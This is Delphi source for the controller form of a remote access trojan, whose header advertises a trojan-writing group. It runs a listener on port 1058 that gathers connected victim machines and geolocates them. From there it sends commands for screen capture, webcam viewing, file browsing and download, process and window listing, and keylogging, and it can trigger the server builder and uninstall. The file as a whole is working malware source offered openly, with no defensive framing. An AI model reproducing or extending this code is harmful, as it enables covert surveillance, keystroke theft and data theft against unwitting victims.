unit Unit1;
{作者BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
远程控制和木马编写群30096995   }

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ExtCtrls, ComCtrls, ToolWin, StdCtrls, ImgList, OleCtrls,
  SHDocVw, WinSkinData, IdComponent, IdTCPServer, IdBaseComponent,
  IdAntiFreezeBase, IdAntiFreeze,   shellapi,jpeg,untTQQWry;

type
  TForm1 = class(TForm)
    MainMenu1: TMainMenu;
    N1: TMenuItem;
    N2: TMenuItem;
    N3: TMenuItem;
    N4: TMenuItem;
    N5: TMenuItem;
    N6: TMenuItem;
    N7: TMenuItem;
    N8: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    StatusBar1: TStatusBar;
    ListView1: TListView;
    ImageList1: TImageList;
    WebBrowser1: TWebBrowser;
    IdAntiFreeze1: TIdAntiFreeze;
    SaveDialog1: TSaveDialog;
    IdTCPServer1: TIdTCPServer;
    SkinData1: TSkinData;
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    ToolButton2: TToolButton;
    ToolButton3: TToolButton;
    ToolButton4: TToolButton;
    ToolButton5: TToolButton;
    ToolButton6: TToolButton;
    ToolButton7: TToolButton;
    ToolButton8: TToolButton;
    ToolButton9: TToolButton;
    ToolButton10: TToolButton;
    ToolBar2: TToolBar;
    Panel1: TPanel;
    Label1: TLabel;
    ComboBox1: TComboBox;
    Panel2: TPanel;
    Label2: TLabel;
    Label3: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    ToolButton22: TToolButton;
    PopupMenu1: TPopupMenu;
    N9: TMenuItem;
    ImageList2: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure ToolButton9Click(Sender: TObject);
    procedure ToolButton10Click(Sender: TObject);
    procedure ToolButton1Click(Sender: TObject);
    procedure ToolButton2Click(Sender: TObject);
    procedure N4Click(Sender: TObject);
    procedure N6Click(Sender: TObject);
    procedure N5Click(Sender: TObject);
    procedure N8Click(Sender: TObject);
    procedure ToolButton3Click(Sender: TObject);
    procedure ToolButton4Click(Sender: TObject);
    procedure ToolButton5Click(Sender: TObject);
    procedure ToolButton6Click(Sender: TObject);
    procedure ToolButton22Click(Sender: TObject);
    procedure N9Click(Sender: TObject);
    procedure IdTCPServer1Disconnect(AThread: TIdPeerThread);
    procedure IdTCPServer1Execute(AThread: TIdPeerThread);
    procedure FormDestroy(Sender: TObject);
    procedure ListView1Change(Sender: TObject; Item: TListItem;
      Change: TItemChange);
    procedure ListView1Click(Sender: TObject);
    procedure ToolButton7Click(Sender: TObject);
    procedure ToolButton8Click(Sender: TObject);
    procedure N7Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    FleshIPList: TStringlist; {存放IP地理位置的列表}
    procedure ZhuDongCmdSend(Miling, Qita: string;isbreak:Boolean);      //消息的发送
    function SendStreamToServer(AThread:TIdPeerThread;Cmd:String): Boolean;
     function GetIPtoAdder(IpName: string): string;
     procedure IdTCPServer1WorkBegin(Sender: TObject; AWorkMode: TWorkMode; const AWorkCountMax: Integer);
     procedure IdTCPServer1WorkEnd(Sender: TObject; AWorkMode: TWorkMode);
     procedure IdTCPServer1Work(Sender: TObject;AWorkMode: TWorkMode; const AWorkCount: Integer);
  end;

  type // 服务器的会话信息。
  Ponlineinf = ^Tonlineinf;
  Tonlineinf = record
    ServerName: string[30];   {服务器主机名称}
    AThread : TIdPeerThread;  {服务器线程}
    Soc: integer;             {服务器线程ID}
    ServerAdd: string[15];    {服务器IP地址}
    AdderStr: string;         {地理位置}
  end;

var
  Form1: TForm1;
  CurrentThread: TIdPeerThread;
  MyFirstBmp:TMemoryStream;
  OnlineServer: array[0..100] of Tonlineinf;
  count:integer;
   // SysDev: TSysDevEnum;
   // Videolist:TStringlist;

implementation
uses
Unit2,Unit3,Unit4,Unit5,Unit6,Unit7,Unit8,Unit9,Unit11,Unit12,Unit13;
 {Unit2     //FTP更新
  Unit3     //服务端生成
  Unit4     //远程屏幕监控
  Unit5     //视频监控
  Unit6     //远程文件管理
  Unit7     //进程管理
  Unit8     //作者
  Unit9     //传输进度
  untTQQWry //IP数据库
  Unit10    //新建文件夹
  Unit11    //运行参数设置
  Unit12    //窗口管理
  Unit13    //键盘记录
  }

{$R *.dfm}
procedure Tform1.ZhuDongCmdSend(Miling, Qita: string;isbreak:Boolean);
begin
 form1.Enabled :=  isbreak;  //停止
  try
    if not SendStreamToServer(CurrentThread,Miling+#13+Qita) then
    begin
     showmessage('连接出错!');
     exit;
    end;
  except
    form1.Enabled := True;    //真
  end;
   form1.Enabled := True;     //真
end;

function Tform1.SendStreamToServer(AThread:TIdPeerThread;Cmd:String): Boolean;
var
  MyStream: TMemoryStream;
  i:integer;
begin
  try
    MyStream:=TMemoryStream.Create;
    MyStream.Write(Cmd[1],Length(Cmd));
    MyStream.Position:=0;
    i:=MyStream.size;
    AThread.Connection.WriteLn(inttostr(i));
    AThread.Connection.WriteStream(MyStream);
    Result := True;
  except
    AThread.Connection.Disconnect;
    AThread.Terminate;
    MyStream.Free;
    Result := False;
  end;
    MyStream.Free;
end;

function getfilesize(str: string): string;
var len: integer;
begin
    len := pos('|', str); //文件夹目录主要操作
    result := copy(str, 1, len - 1);
end;

function Tform1.GetIPtoAdder(IpName: string): string; {从IP地址得到所在地理位置}
var
  QQWry: TQQWry;
  slIPData: TStringlist;
  IPRecordID: int64;
begin
  Result := '';
  try
      QQWry:=TQQWry.Create(ExtractFilePath(Paramstr(0)) + 'QQWry.dat');
      IPRecordID:=QQWry.GetIPDataID(IpName);
      slIPData:=TStringlist.Create;
      QQWry.GetIPDataByIPRecordID(IPRecordID, slIPData);
      QQWry.Destroy;
      Result := slIPData[3];
     // (format('ID: %d IP: %s - %s 国家: %s 地区: %s', [IPRecordID, slIPData[0], slIPData[1], slIPData[2], slIPData[3]]));
      slIPData.Free;
  except //IP地址格式不对!
    Result := 'IP地址格式不对!';
  end; //
  if Result = '' then Result :='【未知数据】' ;
end;

function ReadSeverStream(AThread: TIdPeerThread; var TempStr: string): Boolean;    //读取流
var
  RsltStream: TMemoryStream;
  TheSize:integer;
begin
  try
    RsltStream := TmemoryStream.Create;
    TheSize := AThread.Connection.ReadInteger;
    AThread.Connection.ReadStream(RsltStream, TheSize, False);
    RsltStream.Position := 0;
    SetLength(TempStr, RsltStream.Size);
    RsltStream.Read(TempStr[1],RsltStream.Size);
    Result := True;
  except
    AThread.Connection.Disconnect;
    AThread.Terminate;
    RsltStream.Free;
    Result := False;
  end;
    RsltStream.Free;
end;

//////////////////////////////////////////////////////////////////////////////////////////////////
procedure TForm1.FormCreate(Sender: TObject);
var
  IPFile: string;
  MyStream: TMemoryStream;
  MyStream1: TMemoryStream;
begin
   count:=0;   //清空防止数据的沉积
   MyFirstBmp:=TMemoryStream.Create;     //创建流
   IdTCPServer1.DefaultPort:=1058;    //设置监听端口
    IdTCPServer1.Active:=true;        //开启控件
   if  IdTCPServer1.Active then       //判断开启没
   StatusBar1.Panels.Items[0].Text:='打开临听端口1058成功,请等待服务端上线!';
   StatusBar1.Panels.Items[1].Text:='在线主机0台';
   WebBrowser1.Navigate('http://hi.baidu.com/alalmn');    //打开网站
end;

procedure TForm1.ToolButton9Click(Sender: TObject);
begin       //最小化
    application.Minimize;
end;

procedure TForm1.ToolButton10Click(Sender: TObject);
begin
   close;   //退出程序
end;

procedure TForm1.ToolButton1Click(Sender: TObject);
begin
  ftp.Show;  //更新IP
end;

procedure TForm1.ToolButton2Click(Sender: TObject);
begin
server.Show;  //服务端生成
end;

procedure TForm1.N4Click(Sender: TObject);
begin
  ftp.Show;  //更新IP
end;

procedure TForm1.N6Click(Sender: TObject);
begin
server.Show;  //服务端生成
end;

procedure TForm1.N5Click(Sender: TObject);
begin
close;    //退出
end;

procedure TForm1.N8Click(Sender: TObject);
begin
   ShellExecute(0,nil,PChar('http://hi.baidu.com/alalmn'), nil, nil, SW_NORMAL);
end;

procedure TForm1.ToolButton3Click(Sender: TObject);
begin
    ZhuDongCmdSend('050', '', false);
   // pingmu.Show;   //远程屏幕监控
end;

procedure TForm1.ToolButton4Click(Sender: TObject);
begin
shipin.Show;     //视频监控
end;

procedure TForm1.ToolButton5Click(Sender: TObject);
var
i:integer;
begin
  //  if SendStreamToServer(CurrentThread,'001') then
 // CurrentThread.Connection.WriteLn('001');
     for i:=0 to wenjian.TreeView1.Items.Count-1 do
     begin
     if wenjian.TreeView1.Items.Item[i].ImageIndex=6 then
      begin
        if wenjian.TreeView1.Items.Item[i].HasChildren then
           wenjian.TreeView1.Items.Item[i].DeleteChildren;
           wenjian.TreeView1.Items.Item[i].Delete;
           break;  //停止
      end;
     end;
wenjian.Show;   //远程文件管理
end;

procedure TForm1.ToolButton6Click(Sender: TObject);
begin
   ZhuDongCmdSend('020','',false);
   jincheng.Show;   //进程管理
end;

procedure TForm1.ToolButton22Click(Sender: TObject);
begin
ALALMN.Show;    //作者联系
end;

procedure TForm1.N9Click(Sender: TObject);
begin
   if MessageBox(Application.Handle,'你确定要卸载远程服务端吗？这样你将失去对远程主机的控制!','提示!',MB_OKCANCEL)=1 then
      ZhuDongCmdSend('080','',false);      //向远程发送卸载指令
end;

///////////////////////////////////////////////////////////////////////////////////////////////////////

procedure TForm1.IdTCPServer1Disconnect(AThread: TIdPeerThread);
var
i,j:integer;
begin     //断开反映
    for i:=0 to count-1 do
    begin
     if  OnlineServer[i].Soc = AThread.ThreadID then
     begin
        for j:=0 to ListView1.Items.Count-1 do   //数据条数 数据类型(长度)定义
        begin
          if ListView1.Items.Item[j].Caption = OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) then
          begin
              ListView1.Items.Item[j].Delete;   //删除ListView1的数据
              StatusBar1.Panels.Items[1].Text:='在线主机'+inttostr(ListView1.Items.Count)+'台';   //IdTCPServer1断开后应为把ListView1里面的主机全部删除了这时应该显示为0才对
              break;     //停止
          end;
        end;
        j:=i;
        while j < count-1 do
        begin
         OnlineServer[j].ServerName:=OnlineServer[j+1].ServerName;
         OnlineServer[j].AThread:=OnlineServer[j+1].AThread;
         OnlineServer[j].Soc:= OnlineServer[j+1].Soc;
         OnlineServer[j].ServerAdd:=OnlineServer[j+1].ServerAdd;
         OnlineServer[j].AdderStr:= OnlineServer[j+1].AdderStr;
         inc(j);
        end;
       dec(count);
       break; //停止
      end;

    end;
end;


procedure TForm1.IdTCPServer1Execute(AThread: TIdPeerThread);
var
  MyStream: TMemoryStream;
  RecCMD,TempStr: string;
  ListItem:TListItem;
  RootDStrList: TStringList;
  Tmpmemo: TStringlist;
  TheLItem: TListItem;
  tmplinestr, symbolstr, tmptimestr: string;
  Drivernum, i,j:integer;
  TMP: TTreeNode;
  BufferLen: Integer;
  MyBuffer: array[0..1000000] of byte;
  memStream: TMemoryStream;
  jpg: TJpegImage;
  ASize:Int64;
  AFileStream: TFileStream;
begin         //执行反映
   try
    RecCMD:=AThread.Connection.ReadLn();
   except
       try
       AThread.Connection.Disconnect;
       AThread.Terminate;
       except
       end;
     Exit;
   end;
   case strtoint(RecCMD) of    //开始循环000 查看远程消息的传递
000: begin
      if ReadSeverStream(AThread,TempStr) then
      begin
       Tmpmemo:= TStringlist.Create;
       Tmpmemo.Clear;
       Tmpmemo.Text:= TempStr;
       OnlineServer[count].ServerName:= Tmpmemo.Strings[0];
       OnlineServer[count].AThread:=AThread;
       OnlineServer[count].Soc:= AThread.ThreadID;
       OnlineServer[count].ServerAdd:= AThread.Connection.Socket.Binding.PeerIP;
       ListItem:= ListView1.Items.Add;
       ListItem.Caption:=OnlineServer[count].ServerName+'-'+inttostr(OnlineServer[count].Soc);
       ListItem.SubItems.Add(OnlineServer[count].ServerAdd);
       ListItem.SubItems.Add(Form1.GetIPtoAdder(AThread.Connection.Socket.Binding.PeerIP));
       ListItem.SubItems.Add(Tmpmemo.Strings[1]);
       ListItem.ImageIndex:=0;
       inc(count);
       Tmpmemo.Free;
      end;
     end;
001: begin
       wenjian.Enabled:=false;
       if ReadSeverStream(AThread,TempStr) then
       begin
       RootDStrList:=TStringList.Create;
       RootDStrList.Text := TempStr;
       wenjian.ListView1.Items.Clear;
           if wenjian.Treeview1.Selected.HasChildren then
              wenjian.Treeview1.Selected.DeleteChildren;

           for i := 0 to RootDStrList.Count - 1 do
            begin
             if RootDStrList[i] = '' then Break;  //停止
             TempStr := Copy(RootDStrList[i], 1, 2);
              TMP := wenjian.Treeview1.items.AddChild(wenjian.Treeview1.Selected, TempStr);
             Drivernum := StrtoInt(Copy(RootDStrList[i], 3, 1));

              TMP.ImageIndex :=7;
              TMP.SelectedIndex := 7;

               TMP := wenjian.Treeview1.items.AddChild(TMP, 'Loading...');
               TMP.ImageIndex := -1;
               TMP.SelectedIndex := -1;
               with wenjian.ListView1.Items.Add do
                 begin
                  Caption := TempStr;
                  subitems.text :=' ';
                  ImageIndex := 2;
                 end;
            end;

       end;
       wenjian.Enabled:=true;
     end;
002: begin
       wenjian.Enabled:=false;
        if ReadSeverStream(AThread,TempStr) then
        begin
          Tmpmemo:= TStringlist.Create;
          Tmpmemo.Clear;
          Tmpmemo.Text:= TempStr;

        if Tmpmemo.Text='' then
         begin
          Tmpmemo.Free;
          wenjian.Enabled:=true;
          Exit;
        end;
       wenjian.Treeview1.items.Delete(wenjian.Treeview1.Selected.getFirstChild);
       for i:=0 to Tmpmemo.Count-1 do
       begin
        Tmplinestr := Tmpmemo.Strings[i];
        Symbolstr := Copy(tmplinestr, 1, 1);
        Tmptimestr := Copy(tmplinestr, 2, 16);
        Delete(tmplinestr, 1, 17);
       if symbolstr = '*' then
       begin
        TMP := wenjian.Treeview1.items.AddChild(wenjian.Treeview1.Selected, Tmplinestr);
        TMP.ImageIndex := 8;
        TMP.SelectedIndex := 9;
        TMP := wenjian.Treeview1.items.AddChild(TMP, '.');
        TMP.ImageIndex := -1;
        TMP.SelectedIndex := -1;
        with wenjian.ListView1.Items.Add do
        begin
          Caption := tmplinestr;
          subitems.text := ' ';
          wenjian.ListView1.Items.Item[i].SubItems.Add(Tmptimestr);
          ImageIndex := 3;
        end;
       end;
      if symbolstr = '\' then
        begin
        with wenjian.ListView1.Items.Add do
        begin
         Caption := copy(tmplinestr, length(getfilesize(tmplinestr)) + 2, length(tmplinestr));
         subitems.text := getfilesize(tmplinestr);
          ImageIndex :=5 ;
        end;
       end;
       end;


        end;
       wenjian.Enabled:=true;
     end;
013:begin
     try
      AFileStream := TFileStream.Create(SaveDialog1.FileName, fmCreate);
      AThread.Connection.OnWork:=  Form1.IdTCPServer1Work;
      AThread.Connection.OnWorkBegin:=Form1.IdTCPServer1WorkBegin;
      AThread.Connection.OnWorkEnd:=  Form1.IdTCPServer1WorkEnd;
      ASize:= AThread.Connection.ReadInteger();
      AThread.Connection.ReadStream(AFileStream, ASize);
      finally
      AFileStream.Free;
      end;
    end;
020:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
     jincheng.ListView1.Items.Clear;
     Tmpmemo := TStringList.Create;
     Tmpmemo.Text:=TempStr;
     // ----添加
               j := 0;
          for i := 0 to Tmpmemo.Count - 1 do
          begin
            if Tmpmemo.Strings[i] = '' then break;   //停止
            j := j + 1;
            if j = 1 then
            begin
              TheLItem :=jincheng.ListView1.Items.Add;
              TheLItem.Caption := Tmpmemo[i];
            end;
            if j = 2 then TheLItem.SubItems.Add(Tmpmemo[i]);
            if j = 3 then TheLItem.SubItems.Add(Tmpmemo[i]);
            if j = 4 then
            begin
              if StrToInt(Tmpmemo[i]) <= 2 then TheLItem.SubItems.Add('暂缺') else
                if StrToInt(Tmpmemo[i]) <= 4 then TheLItem.SubItems.Add('低') else
                  if StrToInt(Tmpmemo[i]) <= 6 then TheLItem.SubItems.Add('低于标准') else
                    if StrToInt(Tmpmemo[i]) <= 8 then TheLItem.SubItems.Add('标准') else
                      if StrToInt(Tmpmemo[i]) <= 10 then TheLItem.SubItems.Add('高于标准') else
                        if StrToInt(Tmpmemo[i]) <= 13 then TheLItem.SubItems.Add('高') else
                          if StrToInt(Tmpmemo[i]) <= 24 then TheLItem.SubItems.Add('实时') else
                            TheLItem.SubItems.Add('暂缺');
            end;
            if j = 5 then
            begin
              TheLItem.SubItems.Add(Tmpmemo[i]);
              j := 0;
            end;
          end;
          Tmpmemo.Free;

      end;

    end;
030:begin
        MyStream:=TMemoryStream.Create;
        i := AThread.Connection.ReadInteger;
        AThread.Connection.ReadStream(MyStream, i, False);
        MyStream.Position := 0;
       chuanko.ListBox1.Items.LoadFromStream(MyStream);
        MyStream.Free;
    end;
040:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
       if TempStr='Cmd009' then
         jianpan.Memo1.Lines.Add('启动键盘记录成功!查看记录前请先终止键盘记录!');
       if TempStr='Cmd010' then
         jianpan.Memo1.Lines.Add('键盘记录已经启动过了!');
      end;
    end;
041:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
        if TempStr='Cmd012' then
          jianpan.Memo1.Lines.Add('终止键盘记录成功!');
      end;
    end;
042:begin
        MyStream:=TMemoryStream.Create;
        i := AThread.Connection.ReadInteger;
        AThread.Connection.ReadStream(MyStream, i, False);
        MyStream.Position := 0;
        jianpan.Memo1.Lines.LoadFromStream(MyStream);
        MyStream.Free;
    end;
043:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
      if TempStr='Cmd014' then
         jianpan.Memo1.Lines.Add('清空键盘记录完成!');
      end;
    end;
050:begin
     BufferLen:= AThread.Connection.ReadInteger();
     AThread.Connection.ReadBuffer(MyBuffer,BufferLen);
     MyFirstBmp.Clear;
     MyFirstBmp.Write(MyBuffer,BufferLen);
     MyFirstBmp.Position := 0;
     pingmu.Show;   //启动屏幕查看
     pingmu.Image1.Picture.Bitmap.LoadFromStream(MyFirstBmp);
    end;
060:begin
   try
 //   repeat
    while AThread.Connection.Connected do
    begin
    memStream := TMemoryStream.Create;
    BufferLen := AThread.Connection.ReadInteger;
    memStream.Size := BufferLen;
    AThread.Connection.ReadBuffer(memStream.Memory^, BufferLen);
    jpg := TJpegImage.Create;
    jpg.LoadFromStream(memStream);
    shipin.Image1.Picture.Bitmap.Assign(jpg);
    jpg.Free;
    memStream.Free;
  //  until (AThread.Connection.Connected=False);
    end;
   except
   end;
   end;
061:begin                      //擦测到摄像头
     for i:=0 to count-1 do
     begin
      if  OnlineServer[i].Soc = AThread.ThreadID then
      begin
        for j:=0 to ListView1.Items.Count-1 do
          if ListView1.Items.Item[j].Caption = OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) then
          begin
              ListView1.Items.Item[j].ImageIndex:= 1;
              break;   //停止
          end;
      end;
    end;
   end;
062:begin
     for i:=0 to count-1 do
     begin
      if  OnlineServer[i].Soc = AThread.ThreadID then
      begin
        for j:=0 to ListView1.Items.Count-1 do
          if ListView1.Items.Item[j].Caption = OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) then
          begin
              ListView1.Items.Item[j].ImageIndex:= 0;
              break;  //停止
          end;
      end;
    end;
    end;
064:begin
     if ReadSeverStream(AThread,TempStr) then
        shipin.StatusBar1.SimpleText:=TempStr;
    end;
   end;  //end case
end;

procedure TForm1.IdTCPServer1WorkBegin(Sender: TObject; AWorkMode: TWorkMode; const AWorkCountMax: Integer);
begin
  try
    jindu.Gauge1.Progress := 0;
    jindu.Gauge1.MaxValue := AWorkCountMax;
  except
  end;
end;

procedure TForm1.IdTCPServer1WorkEnd(Sender: TObject; AWorkMode: TWorkMode);
begin
   jindu.Close;
end;

procedure TForm1.IdTCPServer1Work(Sender: TObject;AWorkMode: TWorkMode; const AWorkCount: Integer);
begin
  try
    jindu.Gauge1.Progress := AWorkCount;
    Application.ProcessMessages;
  except
  end;
end;


procedure TForm1.FormDestroy(Sender: TObject);
begin
     MyFirstBmp.Free;    //释放内存
     FleshIPList.Free;
end;

procedure TForm1.ListView1Change(Sender: TObject; Item: TListItem;
  Change: TItemChange);
begin
   StatusBar1.Panels.Items[1].Text:='在线主机'+inttostr(ListView1.Items.Count)+'台';
end;

procedure TForm1.ListView1Click(Sender: TObject);
var
i:integer;
begin
    //showmessage(inttostr(ListView1.ItemIndex ));
    if ListView1.Items.Count<>0 then
    if ListView1.ItemIndex <> -1 then
   for i:=0 to count-1 do
    begin
     if  OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) =ListView1.Items.Item[ListView1.ItemIndex ].Caption then //ListView1.Selected.Caption then
     begin
        CurrentThread:= OnlineServer[i].AThread;
        break;    //停止
     end;
    end;
end;

procedure TForm1.ToolButton7Click(Sender: TObject);
begin
   ZhuDongCmdSend('030','',false);
   chuanko.Show;
end;

procedure TForm1.ToolButton8Click(Sender: TObject);
begin
   jianpan.Show;
end;

procedure TForm1.N7Click(Sender: TObject);
begin
ALALMN.Show;
end;

end.
